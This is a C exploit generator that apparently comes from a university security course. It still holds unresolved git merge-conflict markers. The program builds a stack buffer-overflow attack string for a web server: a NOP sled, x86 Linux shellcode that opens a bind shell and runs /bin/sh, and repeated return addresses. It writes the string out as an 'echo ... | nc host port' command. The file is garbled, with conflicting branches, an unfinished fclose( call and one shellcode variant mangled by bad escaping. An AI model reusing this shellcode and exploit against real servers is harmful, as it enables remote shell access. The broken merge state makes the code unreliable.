#include <string.h> 
#include <stdlib.h>
#include <stdio.h>


FILE *fp;
<<<<<<< HEAD
char shellcode[] = 
"\x31\xc0"          // xorl     %eax,%eax
"\x50"              // pushl    %eax
"\x40"              // incl     %eax
"\x89\xc3"          // movl     %eax,%ebx
"\x50"              // pushl    %eax
"\x40"              // incl     %eax
"\x50"              // pushl    %eax
"\x89\xe1"          // movl     %esp,%ecx
"\xb0\x66"          // movb     $0x66,%al
"\xcd\x80"          // int      $0x80
"\x31\xd2"          // xorl     %edx,%edx
"\x52"              // pushl    %edx
"\x66\x68\x13\xd2"      // pushw    $0xd213
"\x43"              // incl     %ebx
"\x66\x53"          // pushw    %bx
"\x89\xe1"          // movl     %esp,%ecx
"\x6a\x10"          // pushl    $0x10
"\x51"              // pushl    %ecx
"\x50"              // pushl    %eax
"\x89\xe1"          // movl     %esp,%ecx
"\xb0\x66"          // movb     $0x66,%al
"\xcd\x80"          // int      $0x80
"\x40"              // incl     %eax
"\x89\x44\x24\x04"      // movl     %eax,0x4(%esp,1)
"\x43"              // incl     %ebx
"\x43"              // incl     %ebx
"\xb0\x66"          // movb     $0x66,%al
"\xcd\x80"          // int      $0x80
"\x83\xc4\x0c"          // addl     $0xc,%esp
"\x52"              // pushl    %edx
"\x52"              // pushl    %edx
"\x43"              
"\xb0\x66"          
"\xcd\x80"          
"\x93"              
"\x89\xd1"          
"\xb0\x3f"          
"\xcd\x80"          
"\x41"              
"\x80\xf9\x03"          
"\x75\xf6"          
"\x52"              
"\x68\x6e\x2f\x73\x68"      
"\x68\x2f\x2f\x62\x69"      
"\x89\xe3"          
"\x52"              
"\x53"              
"\x89\xe1"         
"\xb0\x0b"          
"\xcd\x80"          
;

//char shellcode[] = "\x5cx31\x5cxdb\x5cxf7\x5cxe3\x5cxb0\x5cx66\x5cx43\x5cx52\x5cx53\x5cx6a\x5cx02\x5cx89\x5cxe1\x5cxcd\x5cx80\x5cx5b\x5cx5e\x5cx52\x5cx66\x5cx68\x5cx22\x5cxb8\x5cx6a\x5cx10\x5cx51\x5cx50\x5cxb0
       // \x5cx66\x5cx89\x5cxe1\x5cxcd\x5cx80\x5cx89\x5cx51\x5cx04\x5cxb0\x5cx66\x5cxb3\x5cx04\x5cxcd\x5cx80\x5cxb0
       // \x5cx66\x5cx43\x5cxcd\x5cx80\x5cx59\x5cx93\x5cx6a\x5cx3f\x5cx58\x5cxcd\x5cx80\x5cx49\x5cx79\x5cxf8\x5cxb0
       // \x5cx0b\x5cx68\x5cx2f\x5cx2f\x5cx73\x5cx68\x5cx68\x5cx2f\x5cx62\x5cx69\x5cx6e\x5cx89\x5cxe3\x5cx41\x5cxcd\x5cx80";
char ret_address[] = "\xb4\xfd\xff\xb4";
char nops[] = "\x90";
=======
char shellcode[] = "\x5cx31\x5cxdb\x5cxf7\x5cxe3\x5cxb0\x5cx66\x5cx43\x5cx52\x5cx53\x5cx6a\x5cx02\x5cx89\x5cxe1\x5cxcd\x5cx80\x5cx5b\x5cx5e\x5cx52\x5cx66\x5cx68\x5cx22\x5cxb8\x5cx6a\x5cx10\x5cx51\x5cx50\x5cxb0\x5cx66\x5cx89\x5cxe1\x5cxcd\x5cx80\x5cx89\x5cx51\x5cx04\x5cxb0\x5cx66\x5cxb3\x5cx04\x5cxcd\x5cx80\x5cxb0\x5cx66\x5cx43\x5cxcd\x5cx80\x5cx59\x5cx93\x5cx6a\x5cx3f\x5cx58\x5cxcd\x5cx80\x5cx49\x5cx79\x5cxf8\x5cxb0\x5cx0b\x5cx68\x5cx2f\x5cx2f\x5cx73\x5cx68\x5cx68\x5cx2f\x5cx62\x5cx69\x5cx6e\x5cx89\x5cxe3\x5cx41\x5cxcd\x5cx80";
char ret_address[] = "\x5cxc0\x5cxfc\x5cxff\x5cxff";
char nops[] = "\x5cx90";
>>>>>>> 3c04901c2519f504f3df855301d6e848e0933df4

int main(int argc, char** argv) {
    int i;
    char* attack_string = (char *)malloc(4096*sizeof (char));
   
   	strcat(attack_string, "echo -e \x22GET /"); 
    
    for (i= 0; i < atoi(argv[2]); i++) {
        strcat(attack_string, nops);
    }

    strcat(attack_string,shellcode);
<<<<<<< HEAD
    
    //strcat(attack_string,"HTTP\x22| nc markschreiber-VirtualBox 10071");
    strcat(attack_string," HTTP | nc 310test.cs.duke.edu 9289");
=======
    for (i = 0; i < atoi(argv[1]); i++) {
        strcat(attack_string, ret_address);
    }
    
  
    strcat(attack_string," HTTP\x22| nc markschreiber-VirtualBox 10071");
    //strcat(attack_string," HTTP | nc 310test.cs.duke.edu 9289");
>>>>>>> 3c04901c2519f504f3df855301d6e848e0933df4
    
    printf("%s\n", attack_string);
    fp = fopen("shellcode.txt", "w");
    fprintf(fp, "%s", attack_string);
<<<<<<< HEAD
    fclose(
=======
    fclose(fp);
>>>>>>> 3c04901c2519f504f3df855301d6e848e0933df4
}
   
